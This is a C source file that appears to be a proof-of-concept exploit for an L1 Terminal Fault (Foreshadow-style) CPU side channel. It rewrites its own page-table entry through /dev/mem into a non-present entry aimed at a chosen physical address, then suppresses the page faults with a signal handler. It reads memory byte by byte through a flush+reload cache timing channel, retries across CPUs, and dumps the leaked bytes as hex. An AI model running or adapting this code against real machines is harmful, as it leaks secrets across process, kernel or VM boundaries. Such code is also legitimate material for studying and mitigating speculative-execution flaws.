#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <signal.h>
#include <unistd.h>
#include <ucontext.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/sysinfo.h>


#define PAGE_SIZE (4096)
#define CACHE_ELEMS (16)
#define CACHE_ELEM_SIZE (PAGE_SIZE)

#define MIN_VARIANCE_MULT (2)
#define BYTE_READ_ATTEMPTS (10000)
#define BYTE_CONFIDENCE_THRESH (2)
#define ZERO_CONFIDENCE_THRESH (10)

// Has to be a valid PFN that is "easy to find" and unique-ish in memory
#define MAGIC_PHY_ADDR (0x7badbee000)


extern void clflush(const void *ptr);
extern uint64_t measure_access_time(void *ptr);
extern void do_access(uint8_t *our_buffer_msb, uint8_t *our_bufferlsb, uint8_t *ptr);
extern void *after_exception;

typedef struct {
    uint32_t delta;
    uint8_t val;
} timed_val_t;

typedef struct {
    uint8_t _a[CACHE_ELEM_SIZE];
    uint8_t buffer_msb[CACHE_ELEMS * CACHE_ELEM_SIZE];
    uint8_t _b[CACHE_ELEM_SIZE];
    uint8_t buffer_lsb[CACHE_ELEMS * CACHE_ELEM_SIZE];
    uint8_t _c[CACHE_ELEM_SIZE];
} protected_buffer_t;


// This is the buffer that will act as a covert channel to the speculatively executed code
protected_buffer_t *our_buffer = NULL;


void sighandler(int sig, siginfo_t *info, void *_context)
{
    ucontext_t *context = (ucontext_t *)(_context);
    // Upon a segfault, simply skip to the end of the "do_access" code
    context->uc_mcontext.gregs[REG_RIP] = (uint64_t)(&after_exception);
}

void evict_our_buffer(void)
{
    int64_t i = 0;

    // This both evicts our buffers from the caches, and puts them in the TLB
    for (i = 0; i < CACHE_ELEMS; i++) {
        clflush(&our_buffer->buffer_lsb[i * CACHE_ELEM_SIZE]);
        clflush(&our_buffer->buffer_msb[i * CACHE_ELEM_SIZE]);
    }
}

bool measure_memory_byte_once(uint8_t *ptr, uint8_t *out_byte)
{
    timed_val_t access_times_lsb[CACHE_ELEMS] = {0};
    timed_val_t access_times_msb[CACHE_ELEMS] = {0};
    uint64_t i = 0;

    evict_our_buffer();

    // Perform attack via the non-present mapping
    do_access(our_buffer->buffer_msb, our_buffer->buffer_lsb, ptr);

    // Record access times to each cache element for both buffer_lsb/msb
    for (i = 0; i < CACHE_ELEMS; i++) {
        access_times_lsb[i].delta = measure_access_time(
            &our_buffer->buffer_lsb[i * CACHE_ELEM_SIZE]
        );
        access_times_lsb[i].val = i;

        access_times_msb[i].delta = measure_access_time(
            &our_buffer->buffer_msb[i * CACHE_ELEM_SIZE]
        );
        access_times_msb[i].val = i;
    }

    // Sort the access_times arrays by the access times
    int cmp(const void *a, const void *b) {
        return ((timed_val_t *)(a))->delta - ((timed_val_t *)(b))->delta;
    }
    qsort(access_times_msb, CACHE_ELEMS, sizeof(access_times_msb[i]), cmp);
    qsort(access_times_lsb, CACHE_ELEMS, sizeof(access_times_lsb[i]), cmp);

    // Check that there is a significant variance between the min access_time to the next
    // access_time in both cases (msb & lsb) at the same time
    if ((access_times_msb[0].delta * MIN_VARIANCE_MULT < access_times_msb[1].delta) &&
        (access_times_lsb[0].delta * MIN_VARIANCE_MULT < access_times_lsb[1].delta)) {

        *out_byte = (access_times_msb[0].val << 4) | access_times_lsb[0].val;
        return true;

    } else {
        // We got noise :(
        *out_byte = 0;
        return false;
    }
}

void set_cpu(uint8_t cpu)
{
    cpu_set_t mask;

    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);

    if (0 != sched_setaffinity(0, sizeof(mask), &mask)) {
        printf("sched_setaffinity fail\n");
    }
}

bool read_memory_byte(uint8_t *ptr, uint8_t *out_byte)
{
    uint64_t i = 0;
    uint64_t byte_scores[0x100] = {0};
    uint8_t num_cpus = get_nprocs();

    // Make a bunch of attempts, as some may fail due to noise
    for (i = 0; i < BYTE_READ_ATTEMPTS; i += 1) {
        // Try running on all CPUs
        set_cpu((i >> 7) % num_cpus);

        if (measure_memory_byte_once(ptr, out_byte)) {
            byte_scores[*out_byte] += 1;

            if (*out_byte != 0 && byte_scores[*out_byte] > BYTE_CONFIDENCE_THRESH) {
                return true;
            }
        }
    }

    // The byte could really be 0, it's harder to be sure though
    if (byte_scores[0] > ZERO_CONFIDENCE_THRESH) {
        *out_byte = 0;
        return true;
    }

    return false;
}

void dump_memory(uint8_t *ptr, uint32_t size)
{
    uint64_t i = 0;
    uint8_t byte = 0;

    printf("Dumping from VA %p\n\n", ptr);

    for (i = 0; i < size; i += 1) {
        if (i % 0x10 == 0 && i != 0) {
            printf("\n");
        }

        if (read_memory_byte(ptr + i, &byte)) {
            printf("%02x ", byte);
        } else {
            printf("?? ");
        }
        fflush(stdout);
    }

    printf("\n");
}

uint64_t *find_pte_by_known_phy_addr(int devmem_fd, void *virt_addr,
                                     uint64_t phy_addr)
{
    // We'll search through all pages of physical memory, and look
    // for a PTE entry corresponding to phy_addr, that is located at the
    // page table offset corresponding to the 9 PTE-index bits of virt_addr

    uint64_t page[512] = {0};
    uint32_t pte_offset = ((uint64_t)(virt_addr) >> 12) & 0x1ff;
    uint64_t addr = 0;
    uint64_t *pt_ptr = NULL;
    uint64_t range_start = 0;
    uint64_t range_end = 0;
    FILE *iomem = NULL;

    // Get only the physical ranges for RAM
    iomem = popen("cat /proc/iomem | grep 'System RAM' | cut -f1 -d:", "r");
    if (iomem == NULL) {
        printf("failed to read or parse /proc/iomem\n");
        return NULL;
    }

    // For every RAM range, for every page, look for the expected PTE
    while (!feof(iomem)) {
        fscanf(iomem, "%lx-%lx", &range_start, &range_end);
        lseek(devmem_fd, range_start, SEEK_SET);

        for (addr = range_start; addr < range_end; addr += sizeof(page)) {
            if (sizeof(page) != read(devmem_fd, &page, sizeof(page))) {
                break;
            }

            if ((page[pte_offset] & 0xffffffffff000) == phy_addr) {
                pt_ptr = mmap(NULL, sizeof(page), PROT_READ | PROT_WRITE,
                              MAP_SHARED, devmem_fd, addr);

                if (pt_ptr == MAP_FAILED) {
                    return NULL;
                }

                return pt_ptr + pte_offset;
            }
        }
    }

    return NULL;
}

int main(int argc, const char *argv[])
{
    struct sigaction sa;
    sa.sa_sigaction = sighandler;
    sa.sa_flags = SA_SIGINFO;
    uint64_t addr = 0;
    uint32_t len = 0;
    int devmem_fd = -1;
    uint8_t *non_present_mapping = NULL;
    char *phys_addr_cmd = NULL;
    uint64_t *mapping_pte = NULL;

    if (argc < 3) {
        printf("usage: <phy addr> <len>\n");
        return 0;
    }

    addr = strtoull(argv[1], NULL, 0);
    len = strtoul(argv[2], NULL, 0);

    // Alloc our_buffer (cache side channel buffer)
    our_buffer = mmap(NULL, sizeof(*our_buffer), PROT_READ | PROT_WRITE,
                      MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (our_buffer == MAP_FAILED) {
        printf("mmap of our_buffer failed\n");
        return 0;
    }

    devmem_fd = open("/dev/mem", O_RDWR);
    if (devmem_fd < 0) {
        printf("can't open /dev/mem\n");
        return 0;
    }

    non_present_mapping = (uint8_t *) mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED,
                                           devmem_fd, MAGIC_PHY_ADDR);
    if (non_present_mapping == MAP_FAILED) {
        printf("/dev/mem mmap of MAGIC_PHY_ADDR failed\n");
        return 0;
    }

    printf("Looking for the PTE for VA %p in RAM...\n", non_present_mapping);

    // Find the PTE for "non_present_mapping" in physical memory by searching for
    // the expected PTE value targeting MAGIC_PHY_ADDR
    mapping_pte = find_pte_by_known_phy_addr(
        devmem_fd, non_present_mapping, MAGIC_PHY_ADDR
    );
    if (mapping_pte == NULL) {
        printf("failed to find or map our PTE\n");
        return 0;
    }

    printf("Our PTE now mapped. Value: %lx\n", *mapping_pte);

    // Make the "non_present_mapping" not-present (after we found the PTE)
    if (0 != mprotect(non_present_mapping, PAGE_SIZE, PROT_NONE)) {
        printf("mprotect to PROT_NONE failed\n");
        return 0;
    }

    // Replace the PTE of "non_present_mapping" with a custom non-present PTE to addr
    *mapping_pte = (addr & (~0xfff)) | 0x300;

    // Catch the page faults
    sigaction(SIGSEGV, &sa, NULL);

    // This will prefetch all TLB entries to our_buffer
    memset(our_buffer, 0, sizeof(*our_buffer));
    dump_memory((uint8_t *)(non_present_mapping + (addr & 0xfff)), len);

    return 0;
}
